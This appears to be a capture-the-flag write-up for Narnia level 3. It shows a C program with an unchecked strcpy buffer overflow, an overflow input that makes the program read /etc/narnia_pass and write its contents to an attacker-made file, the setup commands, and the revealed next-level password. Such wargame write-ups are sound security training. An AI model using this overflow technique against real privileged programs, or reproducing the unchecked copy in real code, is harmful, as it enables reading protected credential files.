# Overview
We get the following C code:
```
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

    int  ifd,  ofd;
    char ofile[16] = "/dev/null";
    char ifile[32];
    char buf[32];

    if(argc != 2){
        printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
        exit(-1);
    }

    /* open files */
    strcpy(ifile, argv[1]);
    if((ofd = open(ofile,O_RDWR)) < 0 ){
        printf("error opening %s\n", ofile);
        exit(-1);
    }
    if((ifd = open(ifile, O_RDONLY)) < 0 ){
        printf("error opening %s\n", ifile);
        exit(-1);
    }

    /* copy from file1 to file2 */
    read(ifd, buf, sizeof(buf)-1);
    write(ofd,buf, sizeof(buf)-1);
    printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

    /* close 'em */
    close(ifd);
    close(ofd);

    exit(1);
}
```

Ok, I think I get it. There is a stack buffer overflow on the `ifile` variable, so by passing a value longer than 32 characters we should be able to overwrite `ofile` and write arbitary files. However we don't want to interfere with the `open(ifile, O_RDONLY)` call.

# Eureka
We can pass a path which is both valid as input file (when starting at index 0), and as output file (when starting at index 32):
```
/etc/narnia_pass////////////////narnia4
```

However, before running the binary, you need to do some prep work. The destination file has to be created, otherwise the `open()` will fail. Also you need to make sure that the file is writeable by narnia4:
```
cd $(mktemp -d)
touch narnia4
chmod 0777 ..
chmod 0777 narnia4
```

Then you just need to run the binary:
```
/narnia/narnia3 /etc/narnia_pass////////////////narnia4
```

Password for the next level is `iqNWNk173q`.
